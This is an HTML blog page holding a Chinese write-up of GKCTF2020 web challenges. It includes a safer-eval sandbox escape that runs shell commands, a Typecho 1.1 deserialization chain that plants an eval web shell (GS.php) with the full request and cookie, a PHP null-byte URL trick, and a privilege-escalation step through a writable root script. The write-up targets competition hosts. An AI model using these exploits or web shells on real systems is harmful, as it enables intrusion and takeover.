@@ -1,0 +1,639 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>GKCTF2020 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"copy_btn":true,"image_zoom":{"enable":true},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="GKCTF2020">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2020-05-25 14:53" pubdate>
+        2020年5月25日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.1k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">GKCTF2020</h1>
+            
+            <div class="markdown-body">
+              <h1 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h1><p>绕下disabled_function</p>
+<h1 id="cve版签到"><a href="#cve版签到" class="headerlink" title="cve版签到"></a>cve版签到</h1><p>cve-2020-7066,\0截断</p>
+<pre><code class="hljs awk">?url=http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0.123</span>%<span class="hljs-number">00</span>www.ctfhub.com</code></pre>
+
+
+
+
+
+<h1 id="老八小超市儿"><a href="#老八小超市儿" class="headerlink" title="老八小超市儿"></a>老八小超市儿</h1><ol>
+<li><p>shopxo 模板getshell，然后发现flag在 /root ,但是没有权限</p>
+</li>
+<li><p>auto.sh 是以root执行的，执行了一个py文件，刚好这个文件是可以改的</p>
+</li>
+<li><p> 写入 os.system(“cat /root/flag &gt; /luck.txt”)  flag在luck.txt</p>
+</li>
+</ol>
+<p>#EZ三剑客-EzNode</p>
+<p>给了源码</p>
+<pre><code class="hljs javascript"><span class="hljs-keyword">const</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);
+<span class="hljs-keyword">const</span> bodyParser = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>);
+
+<span class="hljs-keyword">const</span> saferEval = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;safer-eval&#x27;</span>); <span class="hljs-comment">// 2019.7/WORKER1 找到一个很棒的库</span>
+
+<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;fs&#x27;</span>);
+
+<span class="hljs-keyword">const</span> app = express();
+
+
+app.use(bodyParser.urlencoded(&#123; <span class="hljs-attr">extended</span>: <span class="hljs-literal">false</span> &#125;));
+app.use(bodyParser.json());
+
+<span class="hljs-comment">// 2020.1/WORKER2 老板说为了后期方便优化</span>
+app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;
+  <span class="hljs-keyword">if</span> (req.path === <span class="hljs-string">&#x27;/eval&#x27;</span>) &#123;
+    <span class="hljs-keyword">let</span> delay = <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;
+    <span class="hljs-built_in">console</span>.log(delay);
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Number</span>.isInteger(<span class="hljs-built_in">parseInt</span>(req.query.delay))) &#123;
+      delay = <span class="hljs-built_in">Math</span>.max(delay, <span class="hljs-built_in">parseInt</span>(req.query.delay));
+    &#125;
+    <span class="hljs-keyword">const</span> t = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> next(), delay);
+    <span class="hljs-comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span>
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;
+      <span class="hljs-built_in">clearTimeout</span>(t);
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;timeout&#x27;</span>);
+      <span class="hljs-keyword">try</span> &#123;
+        res.send(<span class="hljs-string">&#x27;Timeout!&#x27;</span>);
+      &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+
+      &#125;
+    &#125;, <span class="hljs-number">1000</span>);
+  &#125; <span class="hljs-keyword">else</span> &#123;
+    next();
+  &#125;
+&#125;);
+
+app.post(<span class="hljs-string">&#x27;/eval&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+  <span class="hljs-keyword">let</span> response = <span class="hljs-string">&#x27;&#x27;</span>;
+  <span class="hljs-keyword">if</span> (req.body.e) &#123;
+    <span class="hljs-keyword">try</span> &#123;
+      response = saferEval(req.body.e);
+    &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+      response = <span class="hljs-string">&#x27;Wrong Wrong Wrong!!!!&#x27;</span>;
+    &#125;
+  &#125;
+  res.send(<span class="hljs-built_in">String</span>(response));
+&#125;);
+
+<span class="hljs-comment">// 2019.10/WORKER1 老板娘说她要看到我们的源代码，用行数计算KPI</span>
+app.get(<span class="hljs-string">&#x27;/source&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/javascript;charset=utf-8&#x27;</span>);
+  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./index.js&#x27;</span>));
+&#125;);
+
+<span class="hljs-comment">// 2019.12/WORKER3 为了方便我自己查看版本，加上这个接口</span>
+app.get(<span class="hljs-string">&#x27;/version&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/json;charset=utf-8&#x27;</span>);
+  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./package.json&#x27;</span>));
+&#125;);
+
+app.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) </span>&#123;
+  res.set(<span class="hljs-string">&#x27;Content-Type&#x27;</span>, <span class="hljs-string">&#x27;text/html;charset=utf-8&#x27;</span>);
+  res.send(fs.readFileSync(<span class="hljs-string">&#x27;./index.html&#x27;</span>))
+&#125;)
+
+app.listen(<span class="hljs-number">80</span>, <span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;
+  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Start listening&#x27;</span>)
+&#125;);</code></pre>
+
+
+
+<p>先要绕过timeout</p>
+<pre><code class="hljs javascript">app.use(<span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;
+  <span class="hljs-keyword">if</span> (req.path === <span class="hljs-string">&#x27;/eval&#x27;</span>) &#123;
+    <span class="hljs-keyword">let</span> delay = <span class="hljs-number">60</span> * <span class="hljs-number">1000</span>;
+    <span class="hljs-built_in">console</span>.log(delay);
+    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">Number</span>.isInteger(<span class="hljs-built_in">parseInt</span>(req.query.delay))) &#123;
+      delay = <span class="hljs-built_in">Math</span>.max(delay, <span class="hljs-built_in">parseInt</span>(req.query.delay));
+    &#125;
+    <span class="hljs-keyword">const</span> t = <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> next(), delay);
+    <span class="hljs-comment">// 2020.1/WORKER3 老板说让我优化一下速度，我就直接这样写了，其他人写了啥关我p事</span>
+    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;
+      <span class="hljs-built_in">clearTimeout</span>(t);
+      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;timeout&#x27;</span>);
+      <span class="hljs-keyword">try</span> &#123;
+        res.send(<span class="hljs-string">&#x27;Timeout!&#x27;</span>);
+      &#125; <span class="hljs-keyword">catch</span> (e) &#123;
+
+      &#125;
+    &#125;, <span class="hljs-number">1000</span>);
+  &#125; <span class="hljs-keyword">else</span> &#123;
+    next();
+  &#125;
+&#125;);</code></pre>
+
+<p>Nodejs文档</p>
+<blockquote>
+<p>setTimeout 当 delay ⼤于 2147483647 或⼩于 1 时，则 delay 将会被设置为 1。 ⾮整 数的 delay 会被截断为整数。   </p>
+</blockquote>
+<p>传一个超过2147483647就可以了</p>
+<p>然后就是<code>safer-eval</code>的洞</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/advisories/GHSA-v63x-xc9j-hhvq">https://github.com/advisories/GHSA-v63x-xc9j-hhvq</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/patriksimek/vm2/issues/197">https://github.com/patriksimek/vm2/issues/197</a></p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+print(requests.post(<span class="hljs-string">&#x27;http://7c3dc324-1f52-4616-937d-918a02c57744.node3.buuoj.cn/eval?delay=2147483649&#x27;</span>, data=&#123;
+    <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-string">&quot;&quot;&quot;(function () &#123;</span>
+<span class="hljs-string">  const process = clearImmediate.constructor(&quot;return process;&quot;)();</span>
+<span class="hljs-string">  return process.mainModule.require(&quot;child_process&quot;).execSync(&quot;cat /flag&quot;).toString()</span>
+<span class="hljs-string">&#125;)()&quot;&quot;&quot;</span>
+    &#125;).text)</code></pre>
+
+
+
+
+
+<h1 id="EZ三剑客-EzWeb"><a href="#EZ三剑客-EzWeb" class="headerlink" title="EZ三剑客-EzWeb"></a>EZ三剑客-EzWeb</h1><p>gopher打redis </p>
+<p>#EZ三剑客-EzTypecho</p>
+<p>题目根据typecho1.1反序列化漏洞改的，把session_start()去掉了，一种做法是上传PHP_SESSION_UPLOAD_PROGRESS造一个session，另外一种是在start还有一个序列化点</p>
+<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Feed</span></span>&#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_type</span> = <span class="hljs-string">&#x27;ATOM 1.0&#x27;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_charset</span> = <span class="hljs-string">&#x27;UTF-8&#x27;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_lang</span> = <span class="hljs-string">&#x27;zh&#x27;</span>;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_items</span> = <span class="hljs-keyword">array</span>();
+
+    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addItem</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$item</span></span>)</span>&#123;
+        <span class="hljs-keyword">$this</span>-&gt;_items[] = <span class="hljs-variable">$item</span>;
+    &#125;
+&#125;
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Typecho_Request</span></span>&#123;
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_params</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;screenName&#x27;</span>=&gt;<span class="hljs-string">&#x27;file_put_contents(\&#x27;GS.php\&#x27;, \&#x27;&lt;?php @eval($_POST[GS]);?&gt;\&#x27;)&#x27;</span>);
+    <span class="hljs-keyword">private</span> <span class="hljs-variable">$_filter</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;assert&#x27;</span>);
+&#125;
+
+<span class="hljs-variable">$payload1</span> = <span class="hljs-keyword">new</span> Typecho_Feed();
+<span class="hljs-variable">$payload2</span> = <span class="hljs-keyword">new</span> Typecho_Request();
+<span class="hljs-variable">$payload1</span>-&gt;addItem(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;author&#x27;</span> =&gt; <span class="hljs-variable">$payload2</span>));
+<span class="hljs-variable">$exp</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;adapter&#x27;</span> =&gt; <span class="hljs-variable">$payload1</span>, <span class="hljs-string">&#x27;prefix&#x27;</span> =&gt; <span class="hljs-string">&#x27;typecho&#x27;</span>);
+<span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-variable">$exp</span>));
+
+
+<span class="hljs-comment">#payload</span>
+POST /install.php?start HTTP/<span class="hljs-number">1.1</span>
+Host: <span class="hljs-number">886</span>aa202<span class="hljs-number">-23</span>fd<span class="hljs-number">-4</span>db6-a311<span class="hljs-number">-9</span>a6bb041e22e.node3.buuoj.cn
+User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">76.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">76.0</span>
+Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span>
+<span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+<span class="hljs-comment">Accept-Encoding: gzip, deflate</span>
+<span class="hljs-comment">Content-Type: application/x-www-form-urlencoded</span>
+<span class="hljs-comment">Content-Length: 0</span>
+<span class="hljs-comment">Origin: http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn</span>
+<span class="hljs-comment">Connection: close</span>
+<span class="hljs-comment">Referer: http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn/install.php</span>
+<span class="hljs-comment">Cookie: _ga=GA1.2.1586838209.1586328755; __typecho_lang=zh_CN;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6NDp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo4OiJBVE9NIDEuMCI7czoyMjoiAFR5cGVjaG9fRmVlZABfY2hhcnNldCI7czo1OiJVVEYtOCI7czoxOToiAFR5cGVjaG9fRmVlZABfbGFuZyI7czoyOiJ6aCI7czoyMDoiAFR5cGVjaG9fRmVlZABfaXRlbXMiO2E6MTp7aTowO2E6MTp7czo2OiJhdXRob3IiO086MTU6IlR5cGVjaG9fUmVxdWVzdCI6Mjp7czoyNDoiAFR5cGVjaG9fUmVxdWVzdABfcGFyYW1zIjthOjE6e3M6MTA6InNjcmVlbk5hbWUiO3M6NTc6ImZpbGVfcHV0X2NvbnRlbnRzKCdHUy5waHAnLCAnPD9waHAgQGV2YWwoJF9QT1NUW0dTXSk7Pz4nKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19czo2OiJwcmVmaXgiO3M6NzoidHlwZWNobyI7fQ==</span>
+<span class="hljs-comment">Upgrade-Insecure-Requests: 1</span>
+<span class="hljs-comment"></span>
+<span class="hljs-comment">shell就在GS.php</span></code></pre>
+
+<p>伪造session_start()解法</p>
+<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests
+
+
+url = <span class="hljs-string">&quot;http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn/install.php?finish=1&quot;</span>
+files = &#123;<span class="hljs-string">&quot;file&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;
+proxies=&#123;<span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://127.0.0.1:8080&quot;</span>&#125;
+headers=&#123;
+<span class="hljs-string">&#x27;cookie&#x27;</span>:<span class="hljs-string">&#x27;PHPSESSID=test;__typecho_config=YToyOntzOjc6ImFkYXB0ZXIiO086MTI6 IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi 4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntpOjA7YToxOntzOjY6ImF1dGhv ciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYX JhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czo5OiJjYXQgL2ZsYWciO31zOjI0OiIAVHlw ZWNob19SZXF1ZXN0AF9maWx0ZXIiO2E6MTp7aTowO3M6Njoic3lzdGVtIjt9fX19fXM6NjoicH JlZml4IjtzOjQ6InRlc3QiO30=&#x27;</span>,
+<span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;http://886aa202-23fd-4db6-a311-9a6bb041e22e.node3.buuoj.cn/install.php&#x27;</span>
+
+&#125;
+
+
+r = requests.post(url=url, files=files, data=&#123;<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>: <span class="hljs-string">&quot;123456789&quot;</span>&#125;,headers=headers,proxies=proxies)
+print(r.text)</code></pre>
+
+
+
+<h1 id="Node-Exe"><a href="#Node-Exe" class="headerlink" title="Node-Exe"></a>Node-Exe</h1><p>不会</p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/CTF/">CTF</a>
+                    
+                  </div>
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/05/28/WHUCTF/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">WHUCTF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/05/20/Zer0pts2020-phpNantokaAdmin/">
+                        <span class="hidden-mobile">[Zer0pts2020]phpNantokaAdmin</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
